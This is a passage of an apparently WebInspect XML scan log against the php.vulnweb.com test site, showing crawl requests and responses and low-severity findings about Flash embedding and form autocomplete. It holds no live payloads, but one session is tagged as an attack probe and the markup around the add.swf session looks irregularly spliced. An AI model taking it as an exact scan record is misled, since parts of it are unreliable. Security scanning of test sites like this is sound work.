This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 1000</description><picture>./pictures/4.jpg</picture></iteminfo>]]></RawResponse><Request id="F88DED6D35677120BD908F83E52CA16A"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=4</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>4</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="F88DED6D35677120BD908F83E52CA16A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="15d42428";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="30879002";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Walking</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 1000</description><picture>./pictures/4.jpg</picture></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:38 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>936</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="04A7DE02AE4076FC68850A0F3E81559D"><URL>http://php.vulnweb.com:80/hpp/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="04A7DE02AE4076FC68850A0F3E81559D"><![CDATA[GET /hpp/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="04A7DE02AE4076FC68850A0F3E81559D";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c9d3052b";
X-Request-Memo: ID="bc947c24";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:38 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 203

<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>

<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></RawResponse><Request id="04A7DE02AE4076FC68850A0F3E81559D"><Method>GET</Method><Path>/hpp/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="04A7DE02AE4076FC68850A0F3E81559D";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c9d3052b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="bc947c24";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>

<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:38 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>203</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="51A519F89532C043C9F82485A4773B21"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="51A519F89532C043C9F82485A4773B21"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 4
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="51A519F89532C043C9F82485A4773B21";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="17b20d8f";
X-Request-Memo: ID="b37f6d13";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

id=5]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:39 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 866

<iteminfo><name>Mean</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 460</description><picture>./pictures/5.jpg</picture></iteminfo>]]></RawResponse><Request id="51A519F89532C043C9F82485A4773B21"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=5</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>4</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="51A519F89532C043C9F82485A4773B21";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="17b20d8f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b37f6d13";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Mean</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 460</description><picture>./pictures/5.jpg</picture></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:39 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>866</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="ED58A34606E5B8DEF3C4E4FCE38845B5"><URL>http://php.vulnweb.com:80/Flash/add.swf</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="fe74975f-3600-4154-a414-ce9311eb785b"><CheckTypeID>Best Practices</CheckTypeID><EngineType>10649</EngineType><AttackHTTPRequest /><VulnerabilityID>10814</VulnerabilityID><Severity>0</Severity><Name>Suggested Security Controls for Embedding SWF Files in HTML</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Flash Bad Practices: Insecure Embedded SWF Setting" href="https://vulncat.fortify.com/">Flash Bad Practices: Insecure Embedded SWF Settings</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[Examination of the ActionScript revealed that it does not utilize any browser or network communication functionality. Recommendations include setting the AllowNetworkingAccess flag to none. This will implicitly disable the SWF applications communication ability to the browser or network.<br /><br />
When a SWF is embedded within HTML, there are several flags which inform the Flash player if the SWF file should have access to content from the browser or from the network. The AllowScriptAccess flag tells the Flash player to allow the SWF to communicate with the browser and HTML DOM using ExternalInterface, fscommand or getURL. The AllowNetworkingAccess flag informs the Flash player that is it allowed to make networking calls like XML.load, loadVariables, LoadVars.load etc. If a Flash application should not communicate with the browser or need to make any networking calls the AllowNetworkingAccess tag should be set to "none". This will prevent the main SWF application and any embedded SWFs from communicating with the browser or the network.
]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />In case of a successful attack on a SWF application, an attacker could gain control over the application and send unauthorized information to an arbitrary site.  ]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />When embedding the SWF file in an HTML page use the allowScriptAccess and allowNetworking parameters to restrict the browser and remote communication abilities of SWF applications.<br /><br />Inside the HTML page, embed the SWF in the following manner: <br /><br /><br />
&lt;object id='MyMovie.swf' classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' <br />codebase='http://download.adobe.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0' height='100%' width='100%'&gt;<br />
&lt;param name='allowNetworking' value='none'/&gt;<br />
&lt;param name='src' value=''MyMovie.swf'/&gt;<br />
&lt;embed name='MyMovie.swf' pluginspage='/go/getflashplayer' src='MyMovie.swf' height='100%' width='100%' allowNetworking='none'/&gt;<br />
&lt;/object&gt;<br /><br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Adobe:</b><br /><a href="http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html">Creating more secure SWF web applications</a><br /><br /><a href="http://blogs.adobe.com/stateofsecurity/2007/07/how_to_restrict_swf_content_fr_1.html">Restricting SWF content from HTML</a><br /><br /><b>OWASP:</b><br /><a href="http://www.owasp.org/index.php/Category:OWASP_Flash_Security_Project">OWASP Flash Security Project</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="ED58A34606E5B8DEF3C4E4FCE38845B5"><![CDATA[GET /Flash/add.swf HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="ED58A34606E5B8DEF3C4E4FCE38845B5";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="src";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="4bbc05a7";
X-Request-Memo: ID="cbd9b705";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

</RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:39 GMT
ETag: "4dca64a1-440a"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/x-shockwave-flash
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:45 GMT
Content-Length: 17418

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:32 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 371

<html>
<head><title>Index of /Flash/</title></head>
<body>
<h1>Index of /Flash/</h1><hr><pre><a href="../">../</a>
<a href="add.fla">add.fla</a>                                            11-May-2011 10:27              154624
<a href="add.swf">add.swf</a>                                            11-May-2011 10:27               17418
</pre><hr></body>
</html>
]]></RawResponse><Request id="F2A0902254BF718D2D648BD01F9C037B"><Method>GET</Method><Path>/Flash/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Flash/add.swf</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="F2A0902254BF718D2D648BD01F9C037B";PSID="ED58A34606E5B8DEF3C4E4FCE38845B5";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="6";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="bbb05542";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9bceda7c";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /Flash/</title></head>
<body>
<h1>Index of /Flash/</h1><hr><pre><a href="../">../</a>
<a href="add.fla">add.fla</a>                                            11-May-2011 10:27              154624
<a href="add.swf">add.swf</a>                                            11-May-2011 10:27               17418
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:32 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>371</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C45DBE932E1A033B975BBF75EA5C367A"><URL>http://php.vulnweb.com:80/AJAX/showxml.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C45DBE932E1A033B975BBF75EA5C367A"><![CDATA[POST /AJAX/showxml.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: text/xml
Content-Length: 89
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="C45DBE932E1A033B975BBF75EA5C367A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="505f748a";
X-Request-Memo: ID="e841851e";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

<xml><node name="nodename1">nodetext1</node><node name="nodename2">nodetext2</node></xml>]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:40 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 156

<pre>&lt;xml&gt;&lt;node name=&quot;nodename1&quot;&gt;nodetext1&lt;/node&gt;&lt;node name=&quot;nodename2&quot;&gt;nodetext2&lt;/node&gt;&lt;/xml&gt;</pre>]]></RawResponse><Request id="C45DBE932E1A033B975BBF75EA5C367A"><Method>POST</Method><Path>/AJAX/</Path><File>showxml</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData>&lt;xml&gt;&lt;node name="nodename1"&gt;nodetext1&lt;/node&gt;&lt;node name="nodename2"&gt;nodetext2&lt;/node&gt;&lt;/xml&gt;</XMLPostData><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>text/xml</Value></Header><Header><Name>Content-Length</Name><Value>89</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="C45DBE932E1A033B975BBF75EA5C367A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="505f748a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e841851e";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<pre>&lt;xml&gt;&lt;node name=&quot;nodename1&quot;&gt;nodetext1&lt;/node&gt;&lt;node name=&quot;nodename2&quot;&gt;nodetext2&lt;/node&gt;&lt;/xml&gt;</pre>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>156</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="93D28727FA66621A9E828329B6210531"><URL>http://php.vulnweb.com:80/Templates/main_dynamic_template.dwt.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="3875823d-4f10-4eb2-8dff-bf0e2be81dfc"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2449" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue><Issue id="2954cf8c-5151-419c-99fa-c26d8242e0f4"><CheckTypeID>Info</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10436</VulnerabilityID><Severity>0</Severity><Name>Flash Object Detected</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Source Code Disclosure" href="https://vulncat.fortify.com/">Flash Misconfiguration: Source Code Disclosure</Classification><Classification kind="CWE" identifier="CWE-540" href="https://cwe.mitre.org/data/definitions/540.html">CWE-540: Information Exposure Through Source Code</Classification></Classifications><DetectionSelection><Location offset="3845" length="204" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A Flash movie or Flash object was found. Flash movies and objects can be decompiled and may contain sensitive information. An attacker could decompile the Flash file and gain access to the confidential information, including any hard-coded passwords and keys, within the Flash file.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
The attacker’s goal in re-creating the original source code may include one or more of the following:
<ul><li>To steal a valuable algorithm for use in his own code </li><li>To understand how a security function works to enable him to bypass it </li><li>To extract confidential information, such as hard-coded passwords and keys</li><li>To enable him to alter the code so that it behaves in a malicious way</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
